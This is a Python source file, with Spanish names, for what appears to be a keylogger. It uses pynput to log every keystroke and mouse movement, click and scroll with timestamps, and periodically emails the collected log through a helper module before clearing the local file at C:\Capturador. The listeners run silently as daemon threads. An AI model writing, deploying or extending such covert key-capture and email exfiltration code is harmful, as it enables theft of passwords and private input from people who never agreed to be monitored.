from pynput import mouse,keyboard
import threading
from time import time
from Archivo import escribir_accion
from Control_correo import actualizar_dia, enviar, reiniciar_dia
from Correo import enviar_correo

def on_move(x, y):
    colocacion = ('{0},{1}'.format(x, y))
    escribir_accion("Mouse", "Moved", time(), colocacion)

def on_click(x, y, button, pressed):
    accion="{0}".format('Pressed' if pressed else 'Released')
    escribir_accion("Mouse", accion, time(), str(button))

def on_scroll(x, y, dx, dy):
    colocacion=('{0}'.format('Down' if dy < 0 else 'Up'))
    escribir_accion("Mouse", "Scrolled", time(), colocacion)

def on_press(key):
    try:
        escribir_accion("Keyboard", "Pressed", time(), key.char)
    except AttributeError:
        escribir_accion("Keyboard", "Pressed", time(), str(key))
    except TypeError:
        pass

def on_release(key):
    try:
        escribir_accion("Keyboard", "Release", time(), key.char)
    except AttributeError:
        escribir_accion("Keyboard", "Release", time(), str(key))
    except TypeError:
        pass

if enviar():
    try:
        enviar_correo()
        actualizar_dia()
        n_archivo = "C:\Capturador\lista_acciones.txt"
        archivo = open(n_archivo, "w")
        archivo.close()
    except:
        reiniciar_dia()
else:
    pass

listener_keyboard= keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
listener_keyboard.setDaemon(True)

listener_mouse= mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll)
listener_mouse.setDaemon(True)

listener_keyboard.start()
listener_mouse.start()

hilo_ppal = threading.main_thread() # Obtiene hilo principal

for hilo in threading.enumerate(): # Recorre hilos activos para controlar estado de su ejecución
    if hilo is hilo_ppal:    # Si el hilo es hilo_ppal continua al siguiente hilo activo
        continue
    hilo.join()         # El programa esperará a que este hilo finalice
